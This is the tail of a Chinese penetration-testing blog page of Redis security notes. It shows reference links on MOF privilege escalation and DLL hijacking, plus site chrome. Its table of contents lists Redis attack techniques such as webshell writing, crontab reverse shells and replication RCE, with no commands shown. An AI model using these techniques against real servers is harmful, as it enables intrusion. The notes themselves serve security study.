+<p>GetShell ：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1488184">https://cloud.tencent.com/developer/article/1488184</a></p>
+<p>MOF提权：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a><br><a target="_blank" rel="noopener" href="https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/">https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/</a><br>DLL劫持&amp;&amp;INK 覆写 来利用redis：<a target="_blank" rel="noopener" href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a> ，工具也是这位师傅写的，感觉好强。</p>
+<p>DLL 劫持参考：</p>
+<p><a target="_blank" rel="noopener" href="https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/">https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://hack-for.fun">m0nk3y</a>
+            <p>原文链接：<a href="https://hack-for.fun/c10c5ca9.html">https://hack-for.fun/c10c5ca9.html</a>
+            <p>发表日期：<a href="https://hack-for.fun/c10c5ca9.html">August 26th 2020, 9:58:53 am</a>
+            <p>更新日期：<a href="https://hack-for.fun/c10c5ca9.html">August 26th 2020, 10:09:09 am</a>
+            <p>版权声明：<b>原创文章转载时请注明出处</b></p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/e42fccb.html" title= "常见端口服务漏洞">
+                    <div class="prevTitle">常见端口服务漏洞</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:ifonlysec@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+    
+    <span id="busuanzi_container_site_uv">累计访客量: <span id="busuanzi_value_site_uv"></span> </span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis-%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Redis 安全学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">Redis 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RESP-%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">RESP 协议介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text">未授权漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-RCE"><span class="toc-number">1.3.2.</span> <span class="toc-text">主从复制 RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E5%87%86%E5%A4%87"><span class="toc-number">1.4.1.</span> <span class="toc-text">复现准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.2.</span> <span class="toc-text">开始复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8redis-%E5%86%99%E5%85%A5webshell"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">场景二：利用redis 写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8redis-%E5%86%99%E5%85%A5crontab-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">场景三：利用redis 写入crontab 反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E5%9B%9B%EF%BC%9A%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">场景四：主从复制RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%94%EF%BC%9ALua-RCE"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">场景五：Lua RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E5%85%AD%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-RCE"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">场景六：缓冲区溢出 RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-%E6%88%AA%E6%96%AD"><span class="toc-number">1.5.</span> <span class="toc-text">绕过 ? 截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">主从复制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setbit-%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text">setbit 命令绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.6.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E4%B8%8BRedis-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">Windows下Redis 利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">2.2.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="toc-number">2.3.</span> <span class="toc-text">攻击场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5Webshell"><span class="toc-number">2.3.1.</span> <span class="toc-text">写入Webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">2.3.2.</span> <span class="toc-text">写入启动项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8mshta-PS-shell"><span class="toc-number">2.3.3.</span> <span class="toc-text">利用mshta PS_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5MOF"><span class="toc-number">2.3.4.</span> <span class="toc-text">写入MOF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL-%E5%8A%AB%E6%8C%81"><span class="toc-number">2.3.5.</span> <span class="toc-text">DLL 劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E8%A6%86%E5%86%99"><span class="toc-number">2.3.6.</span> <span class="toc-text">快捷方式覆写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">2.4.</span> <span class="toc-text">如何防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99"><span class="toc-number">2.6.</span> <span class="toc-text">相关资料</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/c10c5ca9.html" >Redis 安全学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/e42fccb.html" >常见端口服务漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/56cfbe5.html" >PHP CVE、ThinkPHP、PhpMyAdmin、PHP 安全学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/d8714939.html" >PHP以及MYSQL相关版本差异及对应的安全问</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="PHP安全"><span class="iconfont-archer">&#xe606;</span>PHP安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="端口"><span class="iconfont-archer">&#xe606;</span>端口</span>
+    
+        <span class="sidebar-tag-name" data-tags="Redis"><span class="iconfont-archer">&#xe606;</span>Redis</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "m0nk3y"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
